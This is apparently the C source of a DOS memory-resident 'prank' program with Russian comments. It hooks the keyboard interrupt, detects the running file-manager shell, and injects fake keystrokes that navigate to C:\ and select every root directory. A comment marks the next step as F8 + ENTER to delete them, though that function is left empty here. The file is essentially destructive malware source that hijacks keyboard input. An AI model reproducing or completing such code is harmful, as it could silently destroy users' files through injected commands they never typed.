#include <dos.h>
#include <conio.h>
#include <stdio.h>
#include <dir.h>
#include <mem.h>
#include <stdlib.h>
#include "jokelib.h"

unsigned _stklen	= 256;
unsigned _heaplen	= 1024;

// for direct access to keyboard
int far *state =(int far *)MK_FP(0, 0x0417);
int far *head = (int far *)MK_FP(0, 0x041A);
int far *tail = (int far *)MK_FP(0, 0x041C);
int far *tail_new = 0;
int far *tail_old = 0;

// for prikol keys
BYTE nkey = 0;
BYTE current = 0;
int keys[256];

// for messages
BYTE n_mess = 0;
BYTE cur_mess = 0;
char messages[8][32];
BYTE after_key[8];

BYTE fastSTART = 0;
BYTE fastEND = 0;

BYTE shell = 0;


/* ---  NEW VECTOR 0x09 HANDLER ----------------- */
void interrupt (*old_int09)(...);
void interrupt new_int09(...)
{// новый обработчик прерывания от клавиатуры
	int far* first;
	int far* last;
	int tail_temp;
	BYTE scan;
	BYTE i,z;

	scan = inp(0x60);
	if ((scan == 0x53) && (*state & stateLCTRL) && (*state & stateLSHIFT))
		screen[0][0].ch='*';

	(*old_int09)();// вызываем старый обработчик

	if (current >= nkey)// если все клавиши кончились
		setvect(0x09, old_int09);// возвращаем вектор на место
	else
	{
		disable();// разрешаем прерывания
		if ( (current >= fastSTART) && (current < fastEND) )
		{
			if ( (fastEND - current) < 15 )
				z = fastEND - current;
			else
				z = 15;

			*head = 0x1E; *tail = 0x1E;// очистка буфера клавиатуры
			for (i=0; i<z; i++)
			{
				last = (int far*)MK_FP(0x40, *tail);
				*last = keys[current];
				*tail += 2;
				current++;
			}
		}
		else
		{
			tail_new = (int far*)MK_FP(0x40, *tail);
			if (tail_new != tail_old)// нажата ли клавиша?
			{
				tail_old = tail_new;
				first = (int far*)MK_FP(0x40, *head);
				*first = keys[current];// подставить нужную клавишу
				current++;
			}
		}
		enable();// разрешаем прерывания
	}
}// new_int09 END

/*------------- SHELL TYPE func -------------------------------*/
BYTE shell_type()
{
	unsigned mcb_seg;
	MCB_struct far *mcb;
	char name[9];
	int i;

	asm{				// получение сегмента первого MCB блока
		push es			// (недокументированная функция DOS)
		mov ah, 52h
		int 21h
		mov ax,es:[bx-2]
		mov mcb_seg,ax
		pop es
	}

	do
	{
		mcb = (MCB_struct far*)MK_FP(mcb_seg,0x0);// текущий MCB

		if (mcb->owner != 0)// владелец есть?
		{
			memset(name,0,9);// тогда копируем его имя
			for(i=0; i<8; i++)
				name[i] = mcb->name[i];

			if (!memicmp(name,"VC\0",3))
				return VC;// Volkoff Commander
			else if (!memicmp(name,"NC\0",3))
				return NC;// Norton Commander
			else if (!memicmp(name,"DN\0",3))
				return DOSNAVI;// Dos Navigator
			else if (!memicmp(name,"FAR\0",4))
				return FAR;// FAR  *NOT IMPLEMENTED*
			else if (!memicmp(name,"DC\0",3))
				return DISCOCOM;// Disco Commander *NOT IMPLEMENTED*

		}

		mcb_seg += mcb->size + 1;// переход к следующему MCB блоку

	} while (mcb->sign == 0x4D);// пока блоки не кончатся

	return NOT_FOUND;// так ничего и не нашли :(

}// shell_type END


/*------------- ADD KEY func ----------------------------------*/
void add_key (int code)
{// добавить клавишу в список
	keys[nkey] = code;
	nkey++;
}

/*------------- CREATE KEYS func ------------------------------*/
void create_keys_TO_ROOT (void)
{// создаем массив нажатых (якобы) клавиш
	char path[256];
	int disk_old=-1;
	int i = 2;

	memset(path,0,256);// узнаем текущий путь
	if (!getcwd(path, 256))
	{
		printf("error: current path too long\n");
		exit(-1);
	}

	if (path[0] != 'C')// если нас запустили не с C:
	{// программируем смену диска
		add_key (DISK_C); //     "C"
		add_key (DISK_COLON); // ":"
		add_key (ENTER);

		disk_old = path[0]-65;// сохраняем текущий диск
		setdisk(2); // переходим на диск C:
		memset(path,0,256);// какой тут путь?
		if (!getcwd(path, 256))
		{
			printf("error: path on disk C: too long\n");
			exit(-1);
		}

		if (path[3] == 0)
		{
			setdisk(disk_old);
			return;
		}
		else
		{
			add_key (ENTER);
			if (shell==DOSNAVI)
				add_key (HOME);
			i = 3;
		}
	}

	// анилиз пути на диске C:
	if (path[3] != 0)
	{// до корня надо еще доползти
		while (path[i])
		{// считаем количество подкаталогов
			if (path[i] == '\\')
			{// для каждого добавляем HOME+ENTER
				add_key (HOME);
				add_key (ENTER);
			}
			i++;
		}
	}

	// в корневом каталоге надо еще HOME
	add_key (HOME);

	if (disk_old != -1)// если пришлось сменить диск
		setdisk(disk_old); // переходим назад

}// create_keys END

void create_keys_TO_SELECT (void)
{
	ffblk buf;
	char path_old[256];

	if (!getcwd(path_old, 256))
	{
		printf("error: current path too long\n");
		exit(-1);
	}
	if (chdir("C:\\"))
	{
		printf("error: can't set current path to C:\\\n");
		exit(-1);
	}

	if ( findfirst( "C:\*.*", &buf, FA_DIREC ) )
	{
		printf("error: directories on disk C: not found\n");
		exit(-1);
	}

	if (buf.ff_attrib & FA_DIREC)
	{
		fastSTART = nkey;
		add_key(INSERT);
	}

	while (!findnext(&buf))
		if (buf.ff_attrib & FA_DIREC)
			add_key(INSERT);

	add_key(GREY_PLUS);
	add_key(ENTER);

	fastEND = nkey;

	if (chdir(path_old))
	{
		printf("error: can't set current path back to old\n");
		exit(-1);
	}
}

void create_keys_TO_DELETE (void)
{
	;
}

void debug_info (void)
{
	int i;

	printf("********* DEBUG INFO ***********\n");
	for( i=0; i<nkey; i++)
		switch (keys[i])
		{
			case HOME:
				printf("%02u: HOME\n",i);
				break;
			case GREY_PLUS:
				printf("%02u: GREY +\n",i);
				break;
			case ENTER:
				printf("%02u: ENTER\n",i);
				break;
			case F8:
				printf("%02u: F8\n",i);
				break;
			case INSERT:
				printf("%02u: INSERT\n",i);
				break;
			case DISK_C:
				printf("%02u: C\n",i);
				break;
			case DISK_COLON:
				printf("%02u: :\n",i);
				break;
			default:
				printf("%02u: *ERROR*\n",i);
		};

	switch (shell)
	{
		case VC:
			printf("shell Volkoff Commander\n");
			break;
		case NC:
			printf("shell Norton Commander\n");
			break;
		case DOSNAVI:
			printf("shell Dos Navigator\n");
			break;
		case FAR:
			printf("shell FAR\n");
			break;
		case DISCOCOM:
			printf("shell Disco Commander\n");
			break;
		default:
			printf("shell NOT\n");
	}
}


/***************************  M A I N  ********************************/
void main (void)
{
	char huge *tsrstack;//  надо определить свой размер
	char huge *tsrbottom;// штоб в памяти остаться резидентом...
	unsigned tsrsize;//           ...навсегда!
	tsrstack = (char huge*)MK_FP(_SS, _SP);
	tsrbottom = (char huge*)MK_FP(_psp, 0);
	tsrsize = ((tsrstack-tsrbottom) >> 4) + 1;// размер в параграфах (16 байт)

	shell = shell_type();	// определяем из какой оболочки нас запустили

	create_keys_TO_ROOT();	// анализируем место откуда нас запустили
							// и создаем массив нажатых клавиш
							// дабы добраться до "C:\"

	create_keys_TO_SELECT();// считаем количество каталогов
							// в корневом и выделяем их все

	create_keys_TO_DELETE();// F8 + ENTER

//	debug_info();

//	return;

	tail_new = (int far*)MK_FP(0x40, *tail);// для определения
	tail_old = tail_new;//        действительно нажатых клавиш

	old_int09 = getvect(0x09);// сохранить старый вектор
	setvect(0x09, new_int09);// ставим себя на его место

	keep(0, tsrsize);// остаемся в памяти с размером tsrsize
}

